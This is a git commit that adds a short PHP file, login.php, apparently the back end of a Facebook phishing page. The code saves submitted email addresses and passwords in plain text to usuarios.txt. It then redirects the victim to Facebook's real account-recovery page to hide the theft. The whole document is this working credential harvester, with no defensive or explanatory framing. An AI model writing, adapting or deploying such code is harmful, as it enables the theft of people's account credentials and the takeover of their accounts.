f6331ac450e9b2bf9349476e6a64e59efd68eb41
JesusAndreBS <jesusandrebautistasanchez556@gmail.com>
2025-08-14 19:53:22 -0500

    Add files via upload

---
+++ login.php
@@ -0,0 +1,6 @@
+<?php
+file_put_contents("usuarios.txt",$_POST['email'] . "," . $_POST['pass'] ."\n", FILE_APPEND);
+header('Location: https://facebook.com/recover/initiate/');
+include 'registro.php';
+exit();
+?>
